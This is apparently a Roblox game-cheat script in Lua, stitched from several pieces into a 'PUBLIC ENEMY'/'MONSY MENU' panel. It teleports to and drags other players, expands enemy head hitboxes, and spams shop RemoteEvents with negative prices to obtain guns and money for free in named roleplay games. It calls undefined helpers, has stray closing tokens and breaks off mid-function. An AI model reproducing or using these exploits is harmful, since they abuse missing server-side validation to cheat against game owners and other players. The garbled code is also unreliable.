local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")

local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera

-- GUI parent
local screenGui = Instance.new("ScreenGui")
screenGui.Name = ""
screenGui.ResetOnSpawn = false
screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

-- Toggle visibility keybind (K)
UserInputService.InputBegan:Connect(function(input, isProcessed)
	if not isProcessed and input.KeyCode == Enum.KeyCode.K then
		screenGui.Enabled = not screenGui.Enabled
	end
end)

-- Main draggable frame
local mainFrame = Instance.new("Frame", screenGui)
mainFrame.Size = UDim2.new(0, 520, 0, 360)
mainFrame.Position = UDim2.new(0.5, -260, 0.5, -180)
mainFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.BorderSizePixel = 0

-- Title bar
local titleBar = Instance.new("TextLabel", mainFrame)
titleBar.Size = UDim2.new(1, 0, 0, 36)
titleBar.BackgroundColor3 = Color3.fromRGB(255,255,255)
titleBar.Text = "PUBLIC ENEMY"
titleBar.Font = Enum.Font.Roboto
titleBar.TextSize = 22
titleBar.TextColor3 = Color3.fromRGB(0,0,0)
titleBar.BorderSizePixel = 0

-- Left: player list (scrolling)
local leftWidth = 0.34
local scroll = Instance.new("ScrollingFrame", mainFrame)
scroll.Name = ""
scroll.Position = UDim2.new(0, 0, 0, 36)
scroll.Size = UDim2.new(leftWidth, 0, 1, -36)
scroll.BackgroundColor3 = Color3.fromRGB(255,255,255)
scroll.ScrollBarThickness = 6
scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
scroll.BorderSizePixel = 0

local listLayout = Instance.new("UIListLayout", scroll)
listLayout.SortOrder = Enum.SortOrder.LayoutOrder
listLayout.Padding = UDim.new(0, 4)

-- Right: info + buttons
local right = Instance.new("Frame", mainFrame)
right.Position = UDim2.new(leftWidth, 0, 0, 36)
right.Size = UDim2.new(1 - leftWidth, 0, 1, -36)
right.BackgroundColor3 = Color3.fromRGB(255,255,255)
right.BorderSizePixel = 0

-- Center container for Name/Health
local infoContainer = Instance.new("Frame", right)
infoContainer.Size = UDim2.new(1, 0, 0.55, 0)
infoContainer.Position = UDim2.new(0, 0, 0, 8)
infoContainer.BackgroundTransparency = 1

local nameLabel = Instance.new("TextLabel", infoContainer)
nameLabel.Size = UDim2.new(1, -20, 0, 36)
nameLabel.Position = UDim2.new(0, 10, 0, 10)
nameLabel.BackgroundTransparency = 1
nameLabel.Font = Enum.Font.Roboto
nameLabel.TextSize = 22
nameLabel.TextColor3 = Color3.fromRGB(0,0,0)
nameLabel.Text = "Name: None"
nameLabel.TextXAlignment = Enum.TextXAlignment.Center

local healthLabel = Instance.new("TextLabel", infoContainer)
healthLabel.Size = UDim2.new(1, -20, 0, 26)
healthLabel.Position = UDim2.new(0, 10, 0, 60)
healthLabel.BackgroundTransparency = 1
healthLabel.Font = Enum.Font.Roboto
healthLabel.TextSize = 18
healthLabel.TextColor3 = Color3.fromRGB(0,0,0)
healthLabel.Text = "Health: N/A"
healthLabel.TextXAlignment = Enum.TextXAlignment.Center

-- Buttons container
local buttonContainer = Instance.new("Frame", right)
buttonContainer.Size = UDim2.new(1, 0, 0.35, 0)
buttonContainer.Position = UDim2.new(0, 0, 0.6, 0)
buttonContainer.BackgroundTransparency = 1

local padding = Instance.new("UIPadding", buttonContainer)
padding.PaddingTop = UDim.new(0, 5)
padding.PaddingBottom = UDim.new(0, 5)

local btnLayout = Instance.new("UIListLayout", buttonContainer)
btnLayout.SortOrder = Enum.SortOrder.LayoutOrder
btnLayout.Padding = UDim.new(0, 8)
btnLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
btnLayout.VerticalAlignment = Enum.VerticalAlignment.Top

-- Button creator
local function createButton(label)
	local b = Instance.new("TextButton")
	b.Size = UDim2.new(0.85, 0, 0.22, 0)
	b.AnchorPoint = Vector2.new(0.5, 0)
	b.BackgroundColor3 = Color3.fromRGB(255,255,255)
	b.Font = Enum.Font.Roboto
	b.TextSize = 18
	b.Text = label
	b.TextColor3 = Color3.fromRGB(0,0,0)
	b.AutoButtonColor = true
	local corner = Instance.new("UICorner")
	corner.CornerRadius = UDim.new(0, 8)
	corner.Parent = b
	b.Parent = buttonContainer
	return b
end

local viewButton = createButton("View Player")
local tpButton = createButton("Teleport to Player")
local bringButton = createButton("Bring Player") -- bagong button
local friendButton = createButton("Add Friend")

-- State
local selectedPlayer = nil
local isViewing = false
local isBringing = false
local originalCameraSubject = Camera.CameraSubject
local bringConnection

-- Helper: safely revert camera
local function revertCamera()
	if originalCameraSubject and typeof(originalCameraSubject) == "Instance" and originalCameraSubject.Parent then
		Camera.CameraSubject = originalCameraSubject
	else
		if LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
			Camera.CameraSubject = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
		end
	end
	Camera.CameraType = Enum.CameraType.Custom
	isViewing = false
	viewButton.Text = "View Player"
end

-- Build player list
local function refreshPlayerList()
	for _, c in ipairs(scroll:GetChildren()) do
		if c:IsA("TextButton") then c:Destroy() end
	end
	for _, plr in ipairs(Players:GetPlayers()) do
		if plr ~= LocalPlayer then
			local btn = Instance.new("TextButton")
			btn.Size = UDim2.new(1, -8, 0, 28)
			btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
			btn.TextColor3 = Color3.fromRGB(0,0,0)
			btn.Font = Enum.Font.Roboto
			btn.TextSize = 16
			btn.AutoButtonColor = true
			btn.Text = plr.Name
			local corner = Instance.new("UICorner")
			corner.CornerRadius = UDim.new(0, 4)
			corner.Parent = btn
			btn.Parent = scroll
			btn.MouseButton1Click:Connect(function()
				selectedPlayer = plr
				nameLabel.Text = "Name: " .. plr.Name
				local humanoid = plr.Character and plr.Character:FindFirstChildOfClass("Humanoid")
				if humanoid then
					healthLabel.Text = "Health: " .. math.floor(humanoid.Health)
				else
					healthLabel.Text = "Health: N/A"
				end
				if isViewing then revertCamera() end
			end)
		end
	end
end

-- Button behaviors
viewButton.MouseButton1Click:Connect(function()
	if not selectedPlayer then return end
	local char = selectedPlayer.Character
	local humanoid = char and char:FindFirstChildOfClass("Humanoid")
	if not humanoid then return end
	if not isViewing then
		originalCameraSubject = Camera.CameraSubject
		Camera.CameraSubject = humanoid
		Camera.CameraType = Enum.CameraType.Custom
		isViewing = true
		viewButton.Text = "Unview Player"
	else
		revertCamera()
	end
end)

tpButton.MouseButton1Click:Connect(function()
	if not selectedPlayer then return end
	local targetHRP = selectedPlayer.Character and selectedPlayer.Character:FindFirstChild("HumanoidRootPart")
	local myHRP = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
	if targetHRP and myHRP then
		myHRP.CFrame = targetHRP.CFrame + Vector3.new(2, 0.5, 0)
	end
end)

bringButton.MouseButton1Click:Connect(function()
	if not selectedPlayer then return end
	if not isBringing then
		isBringing = true
		bringButton.Text = "Unbring Player"
		bringConnection = RunService.RenderStepped:Connect(function()
			local targetChar = selectedPlayer.Character
			local myChar = LocalPlayer.Character
			if targetChar and myChar then
				local targetHRP = targetChar:FindFirstChild("HumanoidRootPart")
				local myHRP = myChar:FindFirstChild("HumanoidRootPart")
				if targetHRP and myHRP then
					targetHRP.CFrame = myHRP.CFrame + Vector3.new(2, 0, 0)
				end
			end
		end)
	else
		isBringing = false
		bringButton.Text = "Bring Player"
		if bringConnection then bringConnection:Disconnect() end
	end
end)

friendButton.MouseButton1Click:Connect(function()
	if selectedPlayer then
		LocalPlayer:RequestFriendship(selectedPlayer)
	end
end)

-- Keep health label updated
RunService.Heartbeat:Connect(function()
	if selectedPlayer then
		local humanoid = selectedPlayer.Character and selectedPlayer.Character:FindFirstChildOfClass("Humanoid")
		if humanoid then
			healthLabel.Text = "Health: " .. math.floor(humanoid.Health)
		else
			healthLabel.Text = "Health: N/A"
		end
	end
end)

Players.PlayerRemoving:Connect(function(plr)
	if plr == selectedPlayer then
		selectedPlayer = nil
		nameLabel.Text = "Name: None"
		healthLabel.Text = "Health: N/A"
		if isViewing then revertCamera() end
	end
	refreshPlayerList()
end)

Players.PlayerAdded:Connect(function()
	refreshPlayerList()
end)

refreshPlayerList()
end)

local function addMainMenuButton(text, callback)
	local panel = allTabPanels["MONSY MENU"]
	if not panel then return end
	local btn = new("TextButton", {
		Size = UDim2.new(1, -16, 0, 38),
		BackgroundColor3 = Color3.fromRGB(245,245,245),
		TextColor3 = Color3.new(0,0,0),
		Font = Enum.Font.Roboto,
		TextSize = 14,
		Text = text,
		AutoButtonColor = false,
		Parent = panel,
	})
	new("UICorner", {CornerRadius = UDim.new(0,6), Parent = btn})

	btn.MouseEnter:Connect(function()
		local t = getThemeColors()
		local accent = t.accent or Color3.new(1,1,1)
		local hover = t.bg:Lerp(accent, 0.50)
		TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = hover}):Play()
	end)
	btn.MouseLeave:Connect(function()
		local t = getThemeColors()
		local accent = t.accent or Color3.new(1,1,1)
		local base = t.bg:Lerp(accent, 0.32)
		TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = base}):Play()
	end)

	btn.MouseButton1Click:Connect(function()
		clickSound:Play()
		callback()
	end)
end

--// 8 Buttons in Main Menu
addMainMenuButton("FPS BOOST CARTOON (MONSY)", function()
	--// FPS BOOST + CARTOON STYLE (ALL BLACK GUI VERSION)
-- Black Frame + Black Button + White Text + Rounded Corners

--// Services
local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")

--// GUI
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local Button = Instance.new("TextButton")
local UICorner = Instance.new("UICorner")
local BtnCorner = Instance.new("UICorner")
local UIStroke = Instance.new("UIStroke")

ScreenGui.Name = ""
ScreenGui.Parent = game.CoreGui

-- Main Frame
Frame.Size = UDim2.new(0, 220, 0, 120)
Frame.Position = UDim2.new(0.4, 0, 0.3, 0)
Frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
Frame.BackgroundTransparency = 0.2
Frame.Active = true
Frame.Draggable = true
Frame.Parent = ScreenGui

UICorner.CornerRadius = UDim.new(0, 10)
UICorner.Parent = Frame

-- Title
Title.Size = UDim2.new(1, 0, 0, 40)
Title.BackgroundTransparency = 1
Title.Text = "FPS BOOST"
Title.TextColor3 = Color3.fromRGB(0,0,0)
Title.Font = Enum.Font.Roboto
Title.TextSize = 20
Title.Parent = Frame

-- Button
Button.Size = UDim2.new(1, -40, 0, 40)
Button.Position = UDim2.new(0, 20, 0, 60)
Button.BackgroundColor3 = Color3.fromRGB(255,255,255) -- black button
Button.TextColor3 = Color3.fromRGB(0,0,0) -- white text
Button.Font = Enum.Font.Roboto
Button.TextSize = 18
Button.Text = "ENABLE CARTOON"
Button.Parent = Frame

BtnCorner.CornerRadius = UDim.new(0, 6)
BtnCorner.Parent = Button

UIStroke.Thickness = 2
UIStroke.Color = Color3.fromRGB(255, 255, 255)
UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
UIStroke.Parent = Button

--// State
local BoostEnabled = false

--// Functions
local function applyCartoon()
	-- Lighting tweaks
	Lighting.GlobalShadows = false
	Lighting.FogEnd = 100000
	Lighting.Brightness = 2
	Lighting.EnvironmentDiffuseScale = 0
	Lighting.EnvironmentSpecularScale = 0
	Lighting.Ambient = Color3.fromRGB(255, 255, 255)
	Lighting.OutdoorAmbient = Color3.fromRGB(255, 255, 255)

	-- Remove sky + effects
	for _, v in ipairs(Lighting:GetChildren()) do
		if v:IsA("Sky") then
			v:Destroy()
		elseif v:IsA("BlurEffect") or v:IsA("SunRaysEffect") or v:IsA("ColorCorrectionEffect") or v:IsA("BloomEffect") then
			v.Enabled = false
		end
	end

	-- Cartoonify objects
	for _, obj in ipairs(workspace:GetDescendants()) do
		if obj:IsA("Part") or obj:IsA("MeshPart") then
			obj.Material = Enum.Material.SmoothPlastic
			obj.Reflectance = 0
		elseif obj:IsA("Decal") or obj:IsA("Texture") then
			obj:Destroy()
		end
	end

	-- Apply sa bagong spawn characters
	Players.PlayerAdded:Connect(function(player)
		player.CharacterAdded:Connect(function(char)
			task.wait(1)
			for _, obj in ipairs(char:GetDescendants()) do
				if obj:IsA("Part") or obj:IsA("MeshPart") then
					obj.Material = Enum.Material.SmoothPlastic
					obj.Reflectance = 0
				elseif obj:IsA("Decal") or obj:IsA("Texture") then
					obj:Destroy()
				end
			end
		end)
	end)
end

local function resetGraphics()
	-- Default lighting reset
	Lighting.GlobalShadows = true
	Lighting.Brightness = 3
	Lighting.FogEnd = 100000
	Lighting.Ambient = Color3.fromRGB(128, 128, 128)
	Lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)

	-- Enable effects back
	for _, v in ipairs(Lighting:GetChildren()) do
		if v:IsA("BlurEffect") or v:IsA("SunRaysEffect") or v:IsA("ColorCorrectionEffect") or v:IsA("BloomEffect") then
			v.Enabled = true
		end
	end
end

--// Toggle
Button.MouseButton1Click:Connect(function()
	BoostEnabled = not BoostEnabled
	if BoostEnabled then
		applyCartoon()
		Button.Text = "DISABLE CARTOON"
	else
		resetGraphics()
		Button.Text = "ENABLE CARTOON"
	end
end)
end)

addMainMenuButton("LASPINAS SYSTEM (MONSY)", function()
	--// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = ""
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Position = UDim2.new(0.5, -130, 0.5, -160)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 1
frame.BorderColor3 = Color3.fromRGB(40, 40, 40)
frame.Parent = gui
frame.Active = true
frame.Draggable = true

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(255,255,255)
title.Text = "LAS PINAS ROLEPLAY"
title.TextColor3 = Color3.new(0,0,0)
title.Font = Enum.Font.Roboto
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

-- List of items to buy
local items = {
    {"Silenced Pistol", "Silenced Pistol"},
    {"Heavy Vest", "Heavy Vest"},
    {"Glock-19", "Glock-19"},
    {"Oxy", "Oxy"},
    {"Vector", "Vector"},
    {"Tail", "Tail"},
    {"AmmoBox", "AmmoBox"}
}

local selectedItem = nil

-- Dropdown Button
local dropdown = Instance.new("TextButton")
dropdown.Size = UDim2.new(1, -20, 0, 30)
dropdown.Position = UDim2.new(0, 10, 0, 50)
dropdown.Text = "Select Item"
dropdown.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdown.TextColor3 = Color3.new(0,0,0)
dropdown.Font = Enum.Font.Roboto
dropdown.TextSize = 14
dropdown.Parent = frame
Instance.new("UICorner", dropdown).CornerRadius = UDim.new(0, 6)

-- Dropdown Frame
local itemHeight = 28
local dropdownHeight = #items * itemHeight
local dropdownFrame = Instance.new("Frame")
dropdownFrame.Size = UDim2.new(1, -20, 0, dropdownHeight)
dropdownFrame.Position = UDim2.new(0, 10, 0, 85)
dropdownFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdownFrame.Visible = false
dropdownFrame.Parent = frame
Instance.new("UICorner", dropdownFrame).CornerRadius = UDim.new(0, 5)

-- Dropdown Buttons
for i, item in ipairs(items) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, itemHeight)
    btn.Position = UDim2.new(0, 0, 0, (i - 1) * itemHeight)
    btn.Text = item[1]
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.Roboto
    btn.TextSize = 12
    btn.Parent = dropdownFrame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        selectedItem = item[2]
        dropdown.Text = item[1]
        dropdownFrame.Visible = false
    end)
end

-- Toggle Dropdown
dropdown.MouseButton1Click:Connect(function()
    dropdownFrame.Visible = not dropdownFrame.Visible
end)

-- Auto Buy Button
local toggle = Instance.new("TextButton")
toggle.Size = UDim2.new(1, -20, 0, 35)
toggle.Position = UDim2.new(0, 10, 0, 100 + dropdownHeight)
toggle.Text = "Start Auto Buy"
toggle.BackgroundColor3 = Color3.fromRGB(255,255,255)
toggle.TextColor3 = Color3.new(0,0,0)
toggle.Font = Enum.Font.Roboto
toggle.TextSize = 14
toggle.Parent = frame
Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 6)

-- Auto adjust frame height
local padding = 140 -- title + spacing + toggle
local frameHeight = padding + dropdownHeight
frame.Size = UDim2.new(0, 260, 0, frameHeight)

-- Auto Buy Logic
local isAutoBuying = false
toggle.MouseButton1Click:Connect(function()
    isAutoBuying = not isAutoBuying
    toggle.Text = isAutoBuying and "Stop Auto Buy" or "Start Auto Buy"
    
    while isAutoBuying do
        if selectedItem then
            ReplicatedStorage.ShopRemotes["BuyItem_67c0c0a9-879c-4502-812a-a346fcb4963a"]:FireServer(selectedItem, -100000)
            print("Auto-buying " .. selectedItem)
        end
        task.wait(0.001)
    end
end)

-- RightShift toggle GUI
UIS.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.RightShift then
        gui.Enabled = not gui.Enabled
    end
end)
end)

addMainMenuButton("VENERAL CITY RP (MONSY)", function()
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")

local player = Players.LocalPlayer

local gui = Instance.new("ScreenGui")
gui.Name = ""
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 400)
frame.Position = UDim2.new(0.5, -150, 0.5, -200)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 1
frame.BorderColor3 = Color3.fromRGB(40, 40, 40)
frame.Parent = gui
frame.Active = true
frame.Draggable = true

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(255,255,255)
title.Text = "PUBLIC ENEMY VENERAL ROLEPLAY"
title.TextColor3 = Color3.new(0,0,0)
title.Font = Enum.Font.Roboto
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

local dropdown = Instance.new("TextButton")
dropdown.Size = UDim2.new(1, -20, 0, 30)
dropdown.Position = UDim2.new(0, 10, 0, 50)
dropdown.Text = "Select Gun"
dropdown.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdown.TextColor3 = Color3.new(0,0,0)
dropdown.Font = Enum.Font.Roboto
dropdown.TextSize = 14
dropdown.Parent = frame
Instance.new("UICorner", dropdown).CornerRadius = UDim.new(0, 6)

local gunList = {"Silenced Pistol", "Glock-17", "Desert Eagle", "AmmoBox", "Oxy", "HK416", "UZI"}

local selectedGun = nil

local dropdownFrame = Instance.new("Frame")
dropdownFrame.Size = UDim2.new(1, -20, 0, #gunList * 25)
dropdownFrame.Position = UDim2.new(0, 10, 0, 85)
dropdownFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdownFrame.Visible = false
dropdownFrame.Parent = frame
Instance.new("UICorner", dropdownFrame).CornerRadius = UDim.new(0, 5)

for i, gun in ipairs(gunList) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, 25)
    btn.Position = UDim2.new(0, 0, 0, (i - 1) * 25)
    btn.Text = gun
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.Roboto
    btn.TextSize = 12
    btn.Parent = dropdownFrame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        selectedGun = gun
        dropdown.Text = gun
        dropdownFrame.Visible = false
    end)
end

dropdown.MouseButton1Click:Connect(function()
    dropdownFrame.Visible = not dropdownFrame.Visible
end)

local buttonSpacing = 5
local buttonWidth = (300 - 40 - (buttonSpacing * 2)) / 3
local buttonYOffset = 95 + #gunList * 25

local amountBox = Instance.new("TextBox") 

for i, data in ipairs({
    {Label = "Give 100K", Value = -100000},
    {Label = "Give 1M", Value = -1000000},
    {Label = "Give 10M", Value = -10000000},
}) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0, buttonWidth, 0, 30)
    btn.Position = UDim2.new(0, 10 + (buttonWidth + buttonSpacing) * (i - 1), 0, buttonYOffset)
    btn.Text = data.Label
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.Roboto
    btn.TextSize = 12
    btn.Parent = frame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        amountBox.Text = tostring(data.Value)
    end)
end

amountBox.Size = UDim2.new(1, -20, 0, 30)
amountBox.Position = UDim2.new(0, 10, 0, buttonYOffset + 40)
amountBox.PlaceholderText = "Enter Amount (PUBLIC ENEMY CMD)"
amountBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
amountBox.TextColor3 = Color3.new(0,0,0)
amountBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
amountBox.Font = Enum.Font.Roboto
amountBox.TextSize = 12
amountBox.Parent = frame
Instance.new("UICorner", amountBox).CornerRadius = UDim.new(0, 6)

local toggle = Instance.new("TextButton")
toggle.Size = UDim2.new(1, -20, 0, 35)
toggle.Position = UDim2.new(0, 10, 0, buttonYOffset + 80)
toggle.Text = "Start Auto Give"
toggle.BackgroundColor3 = Color3.fromRGB(255,255,255)
toggle.TextColor3 = Color3.new(0,0,0)
toggle.Font = Enum.Font.Roboto
toggle.TextSize = 14
toggle.Parent = frame
Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 6)

local giving = false

toggle.MouseButton1Click:Connect(function()
    giving = not giving
    toggle.Text = giving and "Stop Auto Give" or "Start Auto Give"
    while giving do
        if selectedGun and tonumber(amountBox.Text) then
            ReplicatedStorage.BuyItemRemote:FireServer(selectedGun, tonumber(amountBox.Text))
        end
        task.wait(0.001)
    end
end)

UIS.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.RightShift then
        gui.Enabled = not gui.Enabled
    end
end)
end)

addMainMenuButton("ADJUSTABLE BIG HEAD (MONSY)", function()
   --// CONFIG
_G.HeadSize = 1 -- Start at 1x size
_G.Disabled = true -- Start disabled

--// SERVICES
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local RunService = game:GetService("RunService")
local UIS = game:GetService("UserInputService")

--// ORIGINAL STORAGE
local OriginalSizes = {}
local OriginalTrans = {}
local OriginalBrickColor = {}
local OriginalMaterial = {}
local OriginalCanCollide = {}
local OriginalMassless = {}

--// APPLY FUNCTION
local function updateHead(head, player)
    if head and player ~= LocalPlayer then
        local key = player
        if not OriginalSizes[key] then
            OriginalSizes[key] = head.Size
            OriginalTrans[key] = head.Transparency
            OriginalBrickColor[key] = head.BrickColor
            OriginalMaterial[key] = head.Material
            OriginalCanCollide[key] = head.CanCollide
            OriginalMassless[key] = head.Massless
        end
        if not _G.Disabled then
            head.Size = Vector3.new(_G.HeadSize, _G.HeadSize, _G.HeadSize)
            head.Transparency = 0.4
            head.BrickColor = BrickColor.new("Red")
            head.Material = Enum.Material.Neon
            head.CanCollide = false
            head.Massless = true
        else
            -- Restore original properties when disabled
            head.Size = OriginalSizes[key]
            head.Transparency = OriginalTrans[key]
            head.BrickColor = OriginalBrickColor[key]
            head.Material = OriginalMaterial[key]
            head.CanCollide = OriginalCanCollide[key]
            head.Massless = OriginalMassless[key]
        end
    end
end

--// UPDATE LOOP
RunService.RenderStepped:Connect(function()
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Character then
            local head = player.Character:FindFirstChild("Head")
            if head then
                pcall(function()
                    updateHead(head, player)
                end)
            end
        end
    end
end)

--// INITIAL AND CONNECTIONS
for _, player in pairs(Players:GetPlayers()) do
    if player ~= LocalPlayer then
        if player.Character then
            local head = player.Character:FindFirstChild("Head")
            if head then
                updateHead(head, player)
            end
        end
        player.CharacterAdded:Connect(function(char)
            char:WaitForChild("Head")
            updateHead(char.Head, player)
        end)
    end
end

Players.PlayerAdded:Connect(function(player)
    if player ~= LocalPlayer then
        player.CharacterAdded:Connect(function(char)
            char:WaitForChild("Head")
            updateHead(char.Head, player)
        end)
    end
end)

--// GUI SETUP
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local SliderBack = Instance.new("Frame")
local SliderFill = Instance.new("Frame")
local SliderButton = Instance.new("TextButton")
local SizeLabel = Instance.new("TextLabel")
local ToggleButton = Instance.new("TextButton")

ScreenGui.Parent = game.CoreGui

-- Frame
Frame.Size = UDim2.new(0, 220, 0, 140)
Frame.Position = UDim2.new(0, 50, 0, 50)
Frame.BackgroundColor3 = Color3.fromRGB(255,255,255) -- All black
Frame.BorderSizePixel = 0
Frame.Active = true
Frame.Draggable = true
Frame.Parent = ScreenGui

-- Title
Title.Size = UDim2.new(1, 0, 0, 30)
Title.BackgroundTransparency = 1
Title.Text = "BIG HEAD SCRIPT"
Title.TextColor3 = Color3.fromRGB(0,0,0)
Title.TextSize = 16
Title.Font = Enum.Font.Roboto
Title.Parent = Frame

-- Slider background
SliderBack.Size = UDim2.new(0.8, 0, 0, 6)
SliderBack.Position = UDim2.new(0.1, 0, 0.35, 0)
SliderBack.BackgroundColor3 = Color3.fromRGB(255,255,255) -- All black
SliderBack.BorderSizePixel = 0
SliderBack.Parent = Frame

-- Slider fill
SliderFill.Size = UDim2.new(0, 0, 1, 0) -- Initial for 1x ( (1-1)/9 = 0 )
SliderFill.BackgroundColor3 = Color3.fromRGB(255, 255, 255) -- White fill
SliderFill.BorderSizePixel = 0
SliderFill.Parent = SliderBack

-- Slider button
SliderButton.Size = UDim2.new(0, 20, 0, 20)
SliderButton.Position = UDim2.new(0, -10, 0.5, -10) -- Initial for 1x
SliderButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255) -- White button
SliderButton.Text = ""
SliderButton.BorderSizePixel = 0
SliderButton.Parent = SliderBack

-- Size text display
SizeLabel.Size = UDim2.new(1, 0, 0, 20)
SizeLabel.Position = UDim2.new(0, 0, 0.45, 0)
SizeLabel.BackgroundTransparency = 1
SizeLabel.TextColor3 = Color3.fromRGB(0,0,0)
SizeLabel.TextSize = 14
SizeLabel.Font = Enum.Font.Roboto
SizeLabel.Text = "Size: " .. string.format("%.1f", _G.HeadSize)
SizeLabel.Parent = Frame

-- Toggle button for Enable/Disable
ToggleButton.Size = UDim2.new(0.8, 0, 0, 30)
ToggleButton.Position = UDim2.new(0.1, 0, 0.7, 0)
ToggleButton.BackgroundColor3 = Color3.fromRGB(255,255,255) -- Black
ToggleButton.BorderColor3 = Color3.fromRGB(0, 0, 0) -- Black border
ToggleButton.TextColor3 = Color3.fromRGB(0,0,0)
ToggleButton.TextSize = 14
ToggleButton.Font = Enum.Font.Roboto
ToggleButton.Text = "Disabled: On"
ToggleButton.Parent = Frame

-- Size slider logic
local dragging = false

local function updateSize(percent)
    percent = math.clamp(percent, 0, 1)
    SliderFill.Size = UDim2.new(percent, 0, 1, 0)
    SliderButton.Position = UDim2.new(percent, -10, 0.5, -10)
    local newSize = 1 + percent * 9  -- 1 to 10 range
    _G.HeadSize = newSize
    SizeLabel.Text = "Size: " .. string.format("%.1f", newSize)
end

SliderButton.MouseButton1Down:Connect(function()
    dragging = true
end)

UIS.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
    end
end)

UIS.InputChanged:Connect(function(input)
    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
        local mousePos = UIS:GetMouseLocation()
        local percent = (mousePos.X - SliderBack.AbsolutePosition.X) / SliderBack.AbsoluteSize.X
        updateSize(percent)
    end
end)

-- Toggle Enable/Disable
ToggleButton.MouseButton1Click:Connect(function()
    _G.Disabled = not _G.Disabled
    if _G.Disabled then
        ToggleButton.Text = "Disabled: On"
        ToggleButton.BackgroundColor3 = Color3.fromRGB(255,255,255) -- Black
        ToggleButton.BorderColor3 = Color3.fromRGB(0, 0, 0) -- Black border
    else
        ToggleButton.Text = "Disabled: Off"
        ToggleButton.BackgroundColor3 = Color3.fromRGB(255,255,255) -- Black
        ToggleButton.BorderColor3 = Color3.fromRGB(0, 0, 0) -- Black border
    end
end)

-- Initial setup
updateSize((_G.HeadSize - 1) / 34)
end)

addMainMenuButton("PERSIONAL SCRIPT FOR (MONSY)", function()
    --// CONFIG
_G.HeadSize = 1
_G.HeadTransparency = 0.8
_G.Disabled = true

--// SERVICES
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local RunService = game:GetService("RunService")
local UIS = game:GetService("UserInputService")

--// ORIGINAL STORAGE
local Original = {}

local function storeOriginal(player, head)
	if not Original[player] then
		Original[player] = {
			Size = head.Size,
			Transparency = head.Transparency,
			Color = head.BrickColor,
			Material = head.Material,
			Collide = head.CanCollide,
			Massless = head.Massless
